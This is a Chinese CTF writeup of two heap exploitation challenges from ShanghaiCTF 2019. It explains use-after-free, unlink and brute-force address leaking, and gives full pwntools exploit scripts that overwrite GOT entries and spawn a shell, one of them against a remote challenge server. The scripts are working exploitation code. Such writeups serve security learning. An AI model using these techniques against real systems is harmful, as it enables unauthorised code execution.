---
title: ShanghaiCTF
date: 2019-11-03
categories: 
- competition
tags: heap
---

# pwn的writeup

三道题全是堆TvT

## slient_note

有关`unsorted bin`的切割。  

这里他只有两个指针，一个指向大堆，一个指向小堆，`free`之后指针没有置空。利用切割的特性可以让两个堆有`overlap`，而且题目十分友好没有开`PIE`TvT，那么就可以来一发`unlink`。  

先`free`大的，再分配小的，就可以让大堆溢出到小堆构造`unlink`。  

把`free@got`的内容写成`puts@plt`就可以泄露`libc`基址。但是这一道题没有给`libc`文件，我当时没做出来，所以还没有去钻研怎么搞。但是其他两道题给了，根据CTF的尿性，应该可以用另外两道题的TvT。

但是这里需要注意的一个地方是记得在`top chunk`之前做分割！！！

## exp

```python
from pwn import *
import sys

context.log_level = 'debug'

elf = ELF('./pwn')
sh = process('./pwn')
libc = elf.libc

def add(tag,content):
    sh.sendlineafter('Exit\n','1')
    sh.sendlineafter('Large\n',str(tag))
    sh.sendlineafter('Content:\n',content)

def update(tag,content):
    sh.sendlineafter('Exit\n','3')
    sh.sendlineafter('Large\n',str(tag))
    sh.sendlineafter('Content:\n',content)

def delete(tag):
    sh.sendlineafter('Exit\n','2')
    sh.sendlineafter('Large\n',str(tag))

LARGE = 2
SMALL = 1

add(LARGE,'aaaa')
add(SMALL,'gggg')

delete(LARGE)
add(SMALL,'bbbb')
add(SMALL,'cccc')

ptr = 0x06020D8
payload = p64(0) + p64(0x21) + p64(ptr - 0x18) + p64(ptr - 0x10) + p64(0x20) + p64(0x210)
pause()
update(LARGE,payload)
delete(SMALL)

free_got = elf.got['free']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
payload = p64(0) + p64(0) + p64(puts_got) + p64(free_got)
update(LARGE,payload)
update(LARGE,p64(puts_plt))
delete(SMALL)

puts_addr = u64(sh.recv(6) + '\x00\x00')
libc_addr = puts_addr - libc.symbols['puts']
system_addr = libc_addr + libc.symbols['system']
log.info('---------->puts_addr:{:#x}'.format(puts_addr))
log.info('---------->system_addr:{:#x}'.format(system_addr))

update(LARGE,p64(system_addr))
add(SMALL,'/bin/sh\x00')
delete(SMALL)

sh.interactive()
sh.close()
```

## login

有关爆破的一个题。  

这题也是UAF，`free`之后指针没有置空。注册一个密码长度`0x18`的用户，删除之后再注册一个密码长度`0x18`的用户，就可以实现用户堆和密码堆之间互写。  

用户堆的第一项是密码堆的地址，第二项是一个函数地址，在`login`成功的时候会调用这个函数，并且用第一项作为参数传入。现在这个两个地址都是可写的。难点在怎么把地址弄出来。  

这个地方需要密码堆的内容和你输入的内容相等才能够调用，一开始一直想不出来，但是感谢一位同学提供的思路。  

比如这里我们要爆破`free`的地址，但我们不必往第一项里写`free@got`，可以先写`free@got + 5`，由于地址的最低位是`\x00\x00`,所以我们只需要输入`\x7f`就可以调用第二项的函数。那么接下来输入+4+3……，就可以一位一位爆破出来。

```python
from pwn import *
import sys

#context.log_level = 'debug'
context.terminal = ['deepin-terminal','-x','sh','-c']

elf = ELF('./login')

if sys.argv[1] == 'l':
    libc = elf.libc
    sh = process('./login')
else:
    libc = ELF('./libc-2.23.so')
    sh = remote('8sdafgh.gamectf.com',20000)

def register(id,length,pswd):
    sh.sendlineafter('Choice:\n',str(2))
    sh.sendlineafter('id:\n',str(id))
    sh.sendlineafter('length:\n',str(length))
    sh.sendafter('password:\n',str(pswd))

def login(id,length,pswd):
    sh.sendlineafter('Choice:\n',str(1))
    sh.sendlineafter('id:\n',str(id))
    sh.sendlineafter('length:\n',str(length))
    sh.sendafter('password:\n',str(pswd))
    
def delete(id):
    sh.sendlineafter('Choice:\n',str(3))
    sh.sendlineafter('id:\n',str(id))

def edit(id,pswd):
    sh.sendlineafter('Choice:\n',str(4))
    sh.sendlineafter('id:\n',str(id))
    sh.sendlineafter('pass:\n',str(pswd))


free_got = elf.got['free']
puts_got = elf.got['puts']

register(0,0x18,'aaaa')
delete(0)
register(1,0x18,p64(free_got))
ii = '\x7f'
for r in range(5):
    edit(1,p64(free_got+4-r))
    for i in range(0,0xff+1):
        login(0,0x18, chr(i) + ii)
        info = sh.recvuntil('\n')
        if info[0] == 'W':
            continue
        else:
            ii = chr(i) + ii
            log.info('{}'.format(ii))
            break
pause()
free_addr = u64(ii + '\x00\x00')
free_libc = libc.symbols['free']
libc_addr = free_addr - free_libc
system_addr = libc_addr + libc.symbols['system']
bin_sh = libc_addr + libc.search('/bin/sh').next()

edit(1,p64(bin_sh)+ p64(system_addr))
login(0,0x8,'/bin/sh')
sh.interactive()
sh.close()
```